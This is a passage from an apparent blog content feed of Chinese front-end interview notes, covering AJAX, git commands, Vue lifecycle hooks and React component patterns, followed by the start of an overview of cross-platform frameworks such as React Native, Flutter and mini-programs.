class="hljs-string">&quot;Microsoft.XMLHTTP&quot;</span>);<br>    &#125;<br><br>    ajaxRequest.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;GET&quot;</span>,url,<span class="hljs-literal">true</span>);<br><br>    ajaxRequest.<span class="hljs-property">onreadystatechange</span>=<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-keyword">if</span>(ajaxRequest.<span class="hljs-property">readyState</span>==<span class="hljs-number">4</span> &amp;&amp; ajaxRequest.<span class="hljs-property">status</span>==<span class="hljs-number">200</span>)&#123;<br>            <span class="hljs-comment">//更新dom结点</span><br>            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;myDiv&quot;</span>).<span class="hljs-property">innerHTML</span>=ajaxRequest.<span class="hljs-property">responseText</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ajaxRequest.<span class="hljs-property">response</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="10-JS排序算法底层原理？"><a href="#10-JS排序算法底层原理？" class="headerlink" title="10.JS排序算法底层原理？"></a>10.JS排序算法底层原理？</h3><p>sort（）数组长度小于22使用插入排序，大于22快排；</p><h3 id="11-nextTick"><a href="#11-nextTick" class="headerlink" title="11.nextTick"></a>11.nextTick</h3><h1 id="Git相关"><a href="#Git相关" class="headerlink" title="Git相关"></a>Git相关</h1><p><a href="https://worktile.com/kb/ask/20275.html">https://worktile.com/kb/ask/20275.html</a></p><h3 id="1-常见命令流程"><a href="#1-常见命令流程" class="headerlink" title="1.常见命令流程"></a>1.常见命令流程</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">初始化仓库</span><br>git init  <br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">切换到主分支</span><br>git checkout master<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">获取最新变更</span><br>git fetch origin<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">基于主分支创建dev分支</span><br>git checkout -b dev origin/master<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">添加到缓存</span><br>git add<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">提交到本地仓库</span><br>git commit -m &quot;备注&quot;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">获取最新更新</span><br>git fetch origin<br></code></pre></td></tr></table></figure><h3 id="2-其他指令"><a href="#2-其他指令" class="headerlink" title="2.其他指令"></a>2.其他指令</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">查看仓库状态</span><br>git status<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">将某个工作区的文件添加暂存区</span><br>git add filename   或 git add . 全部<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">查看工作区和暂存区差异</span><br>git diff 分支/id/<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">查看历史记录</span><br>git log<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">代码回滚</span><br>git reset HEAD^  <br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">删除版本库文件</span><br>git rm filename<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">同步远程仓库</span><br>git push -u origin master<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">本地仓库推送到远程仓库</span><br>git remote add origin git@github.com:username/仓库名.git<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">克隆</span><br>git clone url<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">合并分支</span><br>git merge dev<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">删除分支</span><br>git branch -d dev<br><br><br><br></code></pre></td></tr></table></figure><h1 id="NodeJS相关"><a href="#NodeJS相关" class="headerlink" title="NodeJS相关"></a>NodeJS相关</h1><h3 id="1-node流"><a href="#1-node流" class="headerlink" title="1.node流"></a>1.node流</h3><h3 id="2-node如何写接口？"><a href="#2-node如何写接口？" class="headerlink" title="2.node如何写接口？"></a>2.node如何写接口？</h3><h3 id="3-express"><a href="#3-express" class="headerlink" title="3.express"></a>3.express</h3><h3 id="4-node常用模块"><a href="#4-node常用模块" class="headerlink" title="4.node常用模块"></a>4.node常用模块</h3><h1 id="VUE相关"><a href="#VUE相关" class="headerlink" title="VUE相关"></a>VUE相关</h1><h3 id="1-Vue生命周期"><a href="#1-Vue生命周期" class="headerlink" title="1.Vue生命周期"></a>1.Vue生命周期</h3><p><img src="https://cn.vuejs.org/assets/lifecycle.16e4c08e.png" alt="组件生命周期图示"></p><ul><li>beforeCreate:实例初始化完成，props解析之后，data()和computed等选项处理之前立即调用；此时不能获得DOM结点；</li><li>created：Vue实例已经创建，响应式数据、计算属性、方法和侦听器已经设置完成；但是由于没有挂载，依旧不能获得DOM结点；</li><li>beforeMount：组件内容被渲染拿到页面之前执行的函数，组件已经完成了其响应式状态的设置，但是还没有创建DOM结点；</li><li>mounted：组件渲染之后自动执行，一般异步请求写这里；这个阶段数据和DOM都已经完成渲染；</li><li>beforeUpdate：数据变化的时候执行的函数，此时变化后的数据还未渲染到页面上；</li><li>updated：数据变化以后执行，变化的数据已经渲染到页面上；</li><li>beforeUnmount：当Vue应用被销毁时，自动执行的函数；</li><li>unmounted：当vue应用销毁后，且DOM完全销毁之后自动执行；</li></ul><p><img src="https://upload-images.jianshu.io/upload_images/24919918-2b75253c04f7b643.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp" alt="img"></p><h3 id="2-路由守卫"><a href="#2-路由守卫" class="headerlink" title="2.路由守卫"></a>2.路由守卫</h3><h3 id="3-组件通信有哪些？"><a href="#3-组件通信有哪些？" class="headerlink" title="3.组件通信有哪些？"></a>3.组件通信有哪些？</h3><p><a href="https://blog.csdn.net/longfan_/article/details/125324201">https://blog.csdn.net/longfan_/article/details/125324201</a></p><blockquote><p>一般分为如下关系：</p><p>父子间通信；</p><p>非父子间通信（兄弟，隔代）；</p></blockquote><ul><li>props / $emit</li></ul><blockquote><p>父组件通过props的方式向子组件传递数据，而通过$emit子组件可以像父组件通信；</p><p>props只可以从上一级组件传递到下一级组件，即所谓的单向数据流，而且props只读，不可被修改，所有修改都会失效并警告；</p><p>一、不应该在一个组组件内部改变prop，会破坏单向数据绑定；</p></blockquote><ul><li></li></ul><h3 id="4-v-if与show区别"><a href="#4-v-if与show区别" class="headerlink" title="4.v-if与show区别"></a>4.v-if与show区别</h3><h3 id="5-VUE与React区别"><a href="#5-VUE与React区别" class="headerlink" title="5.VUE与React区别"></a>5.VUE与React区别</h3><h3 id="6-Vue-DIff算法"><a href="#6-Vue-DIff算法" class="headerlink" title="6.Vue DIff算法"></a>6.Vue DIff算法</h3><h3 id="7-Vue如何实现监听？"><a href="#7-Vue如何实现监听？" class="headerlink" title="7.Vue如何实现监听？"></a>7.Vue如何实现监听？</h3><h1 id="React相关"><a href="#React相关" class="headerlink" title="React相关"></a>React相关</h1><h3 id="1-类组件和函数组件"><a href="#1-类组件和函数组件" class="headerlink" title="1.类组件和函数组件"></a>1.类组件和函数组件</h3><ul><li><h5 id="函数组件"><a href="#函数组件" class="headerlink" title="函数组件"></a>函数组件</h5></li></ul><blockquote><p>使用JS函数创建的组件；</p><p>首字母大写，React根据此区分组件和HTML元素；</p><p>函数必须有返回值,不渲染内容需要返回null；</p></blockquote><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-comment">//普通函数</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Header</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>头部组件<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>&#125;<br><span class="hljs-comment">//箭头函数</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">Footer</span>=(<span class="hljs-params"></span>)=&gt;&#123;<br>    <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>Rooter<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>&#125;<br><br><br></code></pre></td></tr></table></figure><ul><li><h5 id="类组件"><a href="#类组件" class="headerlink" title="类组件"></a>类组件</h5></li></ul><blockquote><p>使用class语法创建的组件；</p><p>首字母大写，必须继承React.Component父类；</p><p>必须有render函数，返回UI结构，可返回null;</p></blockquote><h5 id="状态组件："><a href="#状态组件：" class="headerlink" title="状态组件："></a>状态组件：</h5><ul><li>无状态组件不定义状态，没有组件生命周期，只负责渲染UI，Hooks出现后函数组件也可以有状态；性能较好；</li><li>有状态组件可以定义自己的状态，拥有生命周期，能力更强；</li></ul><h5 id="类组件问题："><a href="#类组件问题：" class="headerlink" title="类组件问题："></a>类组件问题：</h5><ul><li>处理this问题：绑定箭头函数、bind，声明箭头函数</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">Component</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;react&quot;</span>;<br> <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Component</span> &#123;<br>  <span class="hljs-comment">// 状态</span><br>  state = &#123;<br>    <span class="hljs-attr">count</span>: <span class="hljs-number">0</span>,<br>  &#125;;<br>  <span class="hljs-comment">// 事件处理函数</span><br>  <span class="hljs-title function_">handleClick</span>(<span class="hljs-params">e</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(e)<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">count</span>)<br>  &#125;<br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> (<br>      <span class="language-xml"><span class="hljs-tag">&lt;&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>计数器：&#123;this.state.count&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">+          <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;(e)</span>=&gt;</span>this.handleClick(e)&#125;&gt;按钮<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/&gt;</span></span><br>    );<br>  &#125;<br>&#125;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">App</span>;<br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">Component</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;react&quot;</span>;<br> <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Component</span> &#123;<br>  <span class="hljs-comment">// 状态</span><br>  state = &#123;<br>    <span class="hljs-attr">count</span>: <span class="hljs-number">0</span>,<br>  &#125;;<br>  <span class="hljs-comment">// 事件处理函数</span><br>  <span class="hljs-title function_">handleClick</span>(<span class="hljs-params">e</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(e)<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">count</span>)<br>  &#125;<br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> (<br>      <span class="language-xml"><span class="hljs-tag">&lt;&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>计数器：&#123;this.state.count&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">+          <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;this.handleClick.bind(this)&#125;</span>&gt;</span>按钮<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/&gt;</span></span><br>    );<br>  &#125;<br>&#125;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">App</span>;<br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">Component</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;react&quot;</span>;<br> <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Component</span> &#123;<br>  <span class="hljs-comment">// 状态</span><br>  state = &#123;<br>    <span class="hljs-attr">count</span>: <span class="hljs-number">0</span>,<br>  &#125;;<br>  <span class="hljs-comment">// 事件处理函数</span><br>+  handleClick = <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(e)<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">count</span>)<br>  &#125;<br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> (<br>      <span class="language-xml"><span class="hljs-tag">&lt;&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>计数器：&#123;this.state.count&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;this.handleClick&#125;</span>&gt;</span>按钮<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/&gt;</span></span><br>    );<br>  &#125;<br>&#125;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">App</span>;<br></code></pre></td></tr></table></figure><ul><li>setState</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs js"><br>handleClick = <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-comment">// 修改数据</span><br>  <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(&#123;<br>    <span class="hljs-comment">// key是要修改的数据名称，value是对应的新值</span><br>    <span class="hljs-attr">count</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">count</span> + <span class="hljs-number">1</span>,<br>  &#125;);<br>&#125;;<br>updateList = <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-comment">// 修改列表</span><br>  <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(&#123;<br>    <span class="hljs-attr">list</span>: [...<span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">list</span>, <span class="hljs-string">&#x27;相机&#x27;</span>],<br>  &#125;);<br>&#125;;<br>updateUser = <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-comment">// 修改对象</span><br>  <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(&#123;<br>    <span class="hljs-attr">user</span>: &#123;<br>      ...<span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">user</span>,<br>      <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;tony&#x27;</span>,<br>    &#125;,<br>  &#125;);<br>&#125;;<br><br></code></pre></td></tr></table></figure><h5 id="相同点"><a href="#相同点" class="headerlink" title="相同点"></a>相同点</h5><ul><li>都可以接受属性，返回React元素；</li></ul><h5 id="不同点"><a href="#不同点" class="headerlink" title="不同点"></a>不同点</h5><ul><li>编程思想不同，类组件需要创建实例，基于面向对象的编程方法，而函数式是基于函数式编程；</li><li>内存占用不用：类组件需要创建并保存实例，会占用一定内存，函数组件不需要创建实例，可以节约内存占用；</li><li>捕获特性：函数组件具有值捕获特性；</li><li>状态：类组件有自己的实例，可以定义状态，而且可以修改状态更新组件，函数式组件以前没有状态，现在可以使用 useState 使用状态</li><li>生命周期：类组件有自己完整的生命周期，可以在生命周期内编写逻辑，函数组件以前没有生命周期，现在可以使用 useEffect 实现类似生命周期的功能</li><li>逻辑复用：类组件可以通过继承实现逻辑复用，但官方推荐组件优于继承，函数组件可以通过自定义 hooks 实现逻辑的复用</li><li>跳过更新：类组件可以通过 <code>shouldComponentUpdate</code> 和 <code>PureComponent</code> 来跳过更新，而函数式组件可以使用 <code>React.memo</code> 来跳过更新</li><li>发展前景：未来函数式组件将会成为主流，因为它可以更好的屏蔽 this 问题、规范和复用逻辑，更好的适合事件分片和并发渲染</li></ul><h3 id="2-React-Hook及其优化策略"><a href="#2-React-Hook及其优化策略" class="headerlink" title="2.React Hook及其优化策略"></a>2.React Hook及其优化策略</h3><h1 id="Webpack相关"><a href="#Webpack相关" class="headerlink" title="Webpack相关"></a>Webpack相关</h1><h3 id="1-Webpack配置"><a href="#1-Webpack配置" class="headerlink" title="1.Webpack配置"></a>1.Webpack配置</h3><h3 id="2-loader执行顺序"><a href="#2-loader执行顺序" class="headerlink" title="2.loader执行顺序"></a>2.loader执行顺序</h3><h3 id="3-html-webpack-plugin的作用"><a href="#3-html-webpack-plugin的作用" class="headerlink" title="3.html webpack plugin的作用"></a>3.html webpack plugin的作用</h3><h1 id="计算机网络相关"><a href="#计算机网络相关" class="headerlink" title="计算机网络相关"></a>计算机网络相关</h1><h3 id="1-CDN的理解"><a href="#1-CDN的理解" class="headerlink" title="1.CDN的理解"></a>1.CDN的理解</h3><h3 id="2-跨域问题：什么是跨域？如何解决？"><a href="#2-跨域问题：什么是跨域？如何解决？" class="headerlink" title="2.跨域问题：什么是跨域？如何解决？"></a>2.跨域问题：什么是跨域？如何解决？</h3><h3 id="3-节流与防抖"><a href="#3-节流与防抖" class="headerlink" title="3.节流与防抖"></a>3.节流与防抖</h3><h3 id="4-TCP和UDP区别，三次握手，阻塞重传"><a href="#4-TCP和UDP区别，三次握手，阻塞重传" class="headerlink" title="4.TCP和UDP区别，三次握手，阻塞重传"></a>4.TCP和UDP区别，三次握手，阻塞重传</h3><h3 id="5-http和https"><a href="#5-http和https" class="headerlink" title="5.http和https"></a>5.http和https</h3><h1 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h1><h3 id="1-线程、进程"><a href="#1-线程、进程" class="headerlink" title="1.线程、进程"></a>1.线程、进程</h3><h1 id="网络安全相关"><a href="#网络安全相关" class="headerlink" title="网络安全相关"></a>网络安全相关</h1><h3 id="1-DDOS"><a href="#1-DDOS" class="headerlink" title="1.DDOS"></a>1.DDOS</h3><h3 id="2-Web相关漏洞原理"><a href="#2-Web相关漏洞原理" class="headerlink" title="2.Web相关漏洞原理"></a>2.Web相关漏洞原理</h3><h1 id="算法相关"><a href="#算法相关" class="headerlink" title="算法相关"></a>算法相关</h1><h1 id="Linux相关"><a href="#Linux相关" class="headerlink" title="Linux相关"></a>Linux相关</h1><h3 id="1-linux常用命令"><a href="#1-linux常用命令" class="headerlink" title="1.linux常用命令"></a>1.linux常用命令</h3><h1 id="项目相关"><a href="#项目相关" class="headerlink" title="项目相关"></a>项目相关</h1><h3 id="1-项目上线如何捕获异常？"><a href="#1-项目上线如何捕获异常？" class="headerlink" title="1.项目上线如何捕获异常？"></a>1.项目上线如何捕获异常？</h3><h3 id="2-项目加载头花"><a href="#2-项目加载头花" class="headerlink" title="2.项目加载头花"></a>2.项目加载头花</h3>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
      <tag>面试笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>跨端技术概述</title>
    <link href="/2023/03/27/%E8%B7%A8%E7%AB%AF%E6%8A%80%E6%9C%AF%E6%A6%82%E8%BF%B0/"/>
    <url>/2023/03/27/%E8%B7%A8%E7%AB%AF%E6%8A%80%E6%9C%AF%E6%A6%82%E8%BF%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="跨端技术概述"><a href="#跨端技术概述" class="headerlink" title="跨端技术概述"></a>跨端技术概述</h1><h2 id="一、跨端是什么？"><a href="#一、跨端是什么？" class="headerlink" title="一、跨端是什么？"></a>一、跨端是什么？</h2><h3 id="1-跨端背景"><a href="#1-跨端背景" class="headerlink" title="1.跨端背景"></a>1.跨端背景</h3><ul><li>PC端（Windows,Mac）</li><li>移动端（iOS，Android）</li><li>Web端</li><li>IoT端（车载设备，穿戴设备）</li></ul><h3 id="2-常见痛点"><a href="#2-常见痛点" class="headerlink" title="2.常见痛点"></a>2.常见痛点</h3><ul><li>各端功能几乎一致，各端需要单独配置开发人员；</li><li>开发、维护成本高；</li><li>安卓、IOS发版周期长；</li><li>…</li></ul><h3 id="3-跨端技术方案目标"><a href="#3-跨端技术方案目标" class="headerlink" title="3.跨端技术方案目标"></a>3.跨端技术方案目标</h3><ul><li>研发效率要高：学习成本低、多端一致性高</li><li>用户体验好：稳定性高、性能体验好</li><li>动态化：支持动态化下发、满足日益增长的业务需要</li></ul><h2 id="二、跨端技术介绍"><a href="#二、跨端技术介绍" class="headerlink" title="二、跨端技术介绍"></a>二、跨端技术介绍</h2><h3 id="1-Hybrid"><a href="#1-Hybrid" class="headerlink" title="1.Hybrid"></a>1.Hybrid</h3><blockquote><p>基于WebView渲染，通过JS Bridge把一部分系统功能开放给JS调用；</p></blockquote><p><img src="https://s3.bmp.ovh/imgs/2023/02/04/00bf34ff3043dd9d.jpg"></p><h3 id="2-原生渲染"><a href="#2-原生渲染" class="headerlink" title="2.原生渲染"></a>2.原生渲染</h3><blockquote><p>通过JS开发，通过中间层桥接后使用原生组件来渲染UI界面；</p></blockquote><h4 id="React-Native"><a href="#React-Native" class="headerlink" title="React Native"></a>React Native</h4><p>使用JS+react来开发跨平台的应用（不局限于Web页面）；</p><p><img src="https://s3.bmp.ovh/imgs/2023/02/04/99cd7d1114ab2962.jpg"></p><h3 id="3-自渲染方案"><a href="#3-自渲染方案" class="headerlink" title="3.自渲染方案"></a>3.自渲染方案</h3><blockquote><p>利用Skia重新实现渲染管线，不依赖原生组件；</p></blockquote><h4 id="Flutter"><a href="#Flutter" class="headerlink" title="Flutter"></a>Flutter</h4><p>一套代码库构建精美的、原生平台编译的多平台应用；</p><p><img src="https://s3.bmp.ovh/imgs/2023/02/04/04aafee09057dff4.jpg"></p><p><img src="https://s3.bmp.ovh/imgs/2023/02/04/b4b787eb7bce2d58.jpg"></p><h3 id="4-小程序方案"><a href="#4-小程序方案" class="headerlink" title="4.小程序方案"></a>4.小程序方案</h3><blockquote><p>使用小程序DSL+JS开发，通过中间层桥接后调用原生能力，使用webview来渲染UI界面</p></blockquote><h4 id="字节小程序"><a href="#字节小程序" class="headerlink" title="字节小程序"></a>字节小程序</h4><h4 id=""><a href="#" class="headerlink" title=""></a><img src="https://s3.bmp.ovh/imgs/2023/02/04/78dda77ddb939d0d.jpg"></h4><h4 id="时间管线"><a href="#时间管线" class="headerlink" title="时间管线"></a>时间管线</h4><p><img src="https://s3.bmp.ovh/imgs/2023/02/04/55a31d9ac425d819.jpg"></p><p><img src="https://s3.bmp.ovh/imgs/2023/02/04/812f79882c5af955.jpg"></p><h3 id="5-方案比较"><a href="#5-方案比较" class="headerlink" title="5.方案比较"></a>5.方案比较</h3><p><img src="https://s3.bmp.ovh/imgs/2023/02/04/3ce883f80ef07420.jpg"></p><h2 id="三、基于小程序跨端实践"><a href="#三、基于小程序跨端实践" class="headerlink" title="三、基于小程序跨端实践"></a>三、基于小程序跨端实践</h2><h3 id="1-开发步骤"><a href="#1-开发步骤" class="headerlink" title="1.开发步骤"></a>1.开发步骤</h3><ul><li>下载开发者工具</li><li>开发、调试</li><li>小程序上传</li></ul><h3 id="2-性能优化"><a href="#2-性能优化" class="headerlink" title="2.性能优化"></a>2.性能优化</h3><h5 id="优化意义"><a href="#优化意义" class="headerlink" title="优化意义"></a>优化意义</h5><ul><li>留住用户</li><li>提升转化率</li><li>提升用户体验</li></ul><h5 id="性能指标"><a href="#性能指标" class="headerlink" title="性能指标"></a>性能指标</h5><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span 